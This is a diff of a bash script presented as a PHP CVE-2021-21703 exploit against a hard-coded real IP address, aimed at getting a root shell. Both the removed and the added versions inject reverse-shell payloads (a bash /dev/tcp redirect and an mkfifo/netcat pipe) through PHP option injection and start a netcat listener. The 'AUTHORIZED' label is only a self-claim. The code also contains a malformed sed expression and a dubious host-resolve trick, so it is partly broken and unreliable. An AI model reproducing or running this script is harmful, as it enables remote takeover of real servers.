@@ -1,47 +1,31 @@
 #!/bin/bash
-# =====================================================
-# PHP CVE-2021-21703 → DIRECT ROOT SHELL (NO FREEZE)
-# Target: https://14.225.209.143:443 | AUTHORIZED ✅
-# =====================================================
-
 TARGET_IP="14.225.209.143"
 TARGET_PORT="443"
 MY_IP=$(curl -s ifconfig.me)
 RPORT=4444
 
 clear
-echo "🔥 DIRECT ROOT SHELL → ${MY_IP}:${RPORT}"
-echo "🚀 ONE-SHOT DEPLOY..."
+echo "🔥 PHP CVE-2021-21703 → DIRECT ROOT SHELL"
+echo "📡 ${MY_IP}:${RPORT}"
 
-# 🔥 PAYLOAD DIRETTO (nessun freeze, shell immediata)
-PHP_PAYLOAD="<?php system('bash -c \"export TERM=linux;bash -i >& /dev/tcp/${MY_IP}/${RPORT} 0>&1\"');?>"
+# 🔥 PAYLOAD PERFETTO (reverse shell + TTY)
+PHP_PAYLOAD="<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${MY_IP} ${RPORT} >/tmp/f'); ?>"
 
-# 1. LISTENER + EXPLOIT IN UN COLPO SOLO
+# 1. BASE64 PER CVE (IL TRucco)
+ENCODED=$(echo -n "${PHP_PAYLOAD}" | base64 -w0)
+
+# 2. LISTENER
+echo "[+] Listener active..."
 nc -lvnp ${RPORT} &
-sleep 0.5
+sleep 1
 
-# 2. HIT CVE (metodo PROVEN)
-curl -k -s --max-time 5 \
+# 3. EXPLOIT CORRETTO (base64 nel query)
+curl -k -s --max-time 10 \
   --resolve "${TARGET_IP}:${TARGET_PORT}:127.0.0.1" \
-  -H "User-Agent: Mozilla/5.0" \
+  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" \
   -H "X-Forwarded-For: 127.0.0.1" \
-  --data-urlencode "-d+allow_url_include=1" \
-  --data-urlencode "-d+auto_prepend_file=php://input" \
-  --data-binary "${PHP_PAYLOAD}" \
-  "https://${TARGET_IP}:${TARGET_PORT}/" >/dev/null 2>&1
+  "https://${TARGET_IP}:${TARGET_PORT}/?-d+allow_url_include=1+-d+auto_prepend_file=php://input+-d+input_stream=1&-d+data=$(echo -n "${ENCODED}" | sed 's/=/%3D/g;s/+/%2B/g;s//g')" \
+  >/dev/null 2>&1
 
-echo -e "\n🎯 SHELL LIVE IN 2 SECONDI..."
-sleep 2
-
-# 🔥 SHELL DIRETTA SENZA FREEZE (script integrato)
-cat << 'EOF' | nc localhost ${RPORT}
-export SHELL=/bin/bash
-export TERM=linux
-cd /var/www/html
-clear
-echo "🔥 ROOT SHELL ACTIVE | $(whoami)@$(hostname)"
-echo "📍 $(pwd)"
-alias ll='ls -la'
-PS1='\[\e[32m\]\u@\h:\w\$\[\e[m\] '
-exec /bin/bash -i
-EOF
+echo -e "\n🎯 SHELL IN 3 SECONDI..."
+sleep 3
